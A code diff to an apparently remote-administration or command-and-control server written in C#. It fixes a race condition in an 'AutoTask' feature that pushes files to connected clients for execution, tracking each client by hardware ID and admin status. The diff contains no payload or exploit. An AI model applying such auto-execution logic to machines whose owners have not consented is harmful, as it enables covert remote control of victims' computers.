@@ -3155,11 +3155,20 @@ Read-Host 'Press Enter to close'
     {
         foreach (var task in _autoTasks.ToList())
         {
-            // Track by HWID so reconnecting clients don't re-execute
-            if (task.ExecutedHwids.Contains(client.Hwid)) continue;
+            // Atomic check+add: lock prevents race between ExecuteAutoTasksForAllConnected
+            // (UI thread) and ClientConnected Task.Run (thread pool) both seeing Contains=false
+            // and both executing the same task → double-counting.
+            bool alreadyDone;
+            lock (task.ExecutedHwids)
+                alreadyDone = !task.ExecutedHwids.Add(client.Hwid);
+            if (alreadyDone) continue;
 
             // Skip admin-only tasks for non-admin clients
-            if (task.AdminOnly && !client.IsAdmin) continue;
+            if (task.AdminOnly && !client.IsAdmin)
+            {
+                lock (task.ExecutedHwids) task.ExecutedHwids.Remove(client.Hwid);
+                continue;
+            }
 
             try
             {
@@ -3212,20 +3221,25 @@ Read-Host 'Press Enter to close'
                 await client.WriteLock.WaitAsync();
                 if (client.Stream == null) { client.WriteLock.Release(); continue; }
                 try { await Protocol.Packet.WriteToStreamAsync(client.Stream, packet); }
+                catch { lock (task.ExecutedHwids) task.ExecutedHwids.Remove(client.Hwid); throw; }
                 finally { client.WriteLock.Release(); }
-                task.ExecutedHwids.Add(client.Hwid);
-                task.ExecutionCount++;
-                Log($"[+] AutoTask: executed {task.FileName} on {client.Id} (HWID tracked)");
+                Interlocked.Increment(ref task.ExecutionCountField);
+                // All Dispatcher calls are thread-safe — ExecuteAutoTasksForClient may run
+                // from Task.Run (ClientConnected) or UI thread (ExecuteAutoTasksForAllConnected).
+                Dispatcher.BeginInvoke(() =>
+                {
+                    task.NotifyExecutionCount();
+                    GridAutoTasks.Items.Refresh();
+                    Log($"[+] AutoTask: executed {task.FileName} on {client.Id}");
+                });
 
-                // Refresh AutoTask grid to update execution count (BeginInvoke = non-blocking)
-                _ = Dispatcher.BeginInvoke(() => GridAutoTasks.Items.Refresh());
-
-                // Small delay between sends to avoid saturating
                 await Task.Delay(100);
             }
             catch (Exception ex)
             {
-                Log($"[!] AutoTask: failed {task.FileName} on {client.Id}: {ex.Message}");
+                var msg = ex.Message;
+                Dispatcher.BeginInvoke(() =>
+                    Log($"[!] AutoTask: failed {task.FileName} on {client.Id}: {msg}"));
             }
         }
     }
